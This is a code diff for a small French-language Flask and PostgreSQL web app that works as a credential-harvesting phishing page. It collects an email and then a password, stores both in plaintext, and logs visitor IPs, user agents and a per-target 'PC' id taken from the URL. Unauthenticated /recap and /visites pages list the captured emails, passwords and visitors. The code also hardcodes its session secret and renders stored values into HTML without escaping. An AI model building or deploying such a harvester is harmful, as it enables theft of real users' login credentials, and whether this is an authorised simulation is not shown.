@@ -1,7 +1,8 @@
-from flask import Flask, request, render_template, redirect, session
+from flask import Flask, request, render_template, redirect, session, render_template_string
 import psycopg2
 from psycopg2.extras import RealDictCursor
 from datetime import datetime
+import os
 
 app = Flask(__name__)
 app.secret_key = "ceci_est_une_clé_secrète_à_modifier"
@@ -30,20 +31,21 @@ def init_db():
                     user_agent TEXT
                 )
             """)
-            # Force ajout de la colonne user_id si pas encore créée
+            try:
+                c.execute("ALTER TABLE logins ADD COLUMN user_id TEXT")
+            except psycopg2.errors.DuplicateColumn:
+                conn.rollback()
+
             try:
                 c.execute("ALTER TABLE visits ADD COLUMN user_id TEXT")
             except psycopg2.errors.DuplicateColumn:
                 conn.rollback()
         conn.commit()
 
-
 @app.before_request
 def track_visit():
     if request.endpoint not in ("static",):
-        user_id = request.args.get("id") or session.get("user_id", "inconnu")
-        session["user_id"] = user_id
-
+        user_id = request.args.get("id", "inconnu")
         with get_db() as conn:
             with conn.cursor() as c:
                 c.execute(
@@ -65,10 +67,11 @@ def home():
 def step1():
     email = request.form.get("email")
     timestamp = datetime.now().isoformat(timespec='seconds')
-    user_id = session.get("user_id", "inconnu")
+    user_id = request.args.get("id", "inconnu")
 
     session["email"] = email
     session["timestamp"] = timestamp
+    session["user_id"] = user_id
 
     with get_db() as conn:
         with conn.cursor() as c:
@@ -82,14 +85,13 @@ def step2():
     email = session.get("email", "non_renseigné")
     timestamp = session.get("timestamp")
     password = request.form.get("password")
-    user_id = session.get("user_id", "inconnu")
 
     with get_db() as conn:
         with conn.cursor() as c:
             c.execute("""
                 UPDATE logins SET password = %s
-                WHERE timestamp = %s AND email = %s AND password = '' AND user_id = %s
-            """, (password, timestamp, email, user_id))
+                WHERE timestamp = %s AND email = %s AND password = ''
+            """, (password, timestamp, email))
         conn.commit()
 
     session.clear()
@@ -102,7 +104,7 @@ def recap():
             c.execute("SELECT timestamp, email, password, user_id FROM logins ORDER BY id DESC")
             rows = c.fetchall()
 
-    html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th><th>ID utilisateur</th></tr>"
+    html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th><th>PC</th></tr>"
     for row in rows:
         html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td><td>{row['user_id']}</td></tr>"
     html += "</table>"
@@ -115,7 +117,7 @@ def visites():
             c.execute("SELECT timestamp, ip, user_agent, user_id FROM visits ORDER BY id DESC LIMIT 50")
             rows = c.fetchall()
 
-    html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th><th>ID utilisateur</th></tr>"
+    html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th><th>PC</th></tr>"
     for row in rows:
         html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td><td>{row['user_id']}</td></tr>"
     html += "</table>"
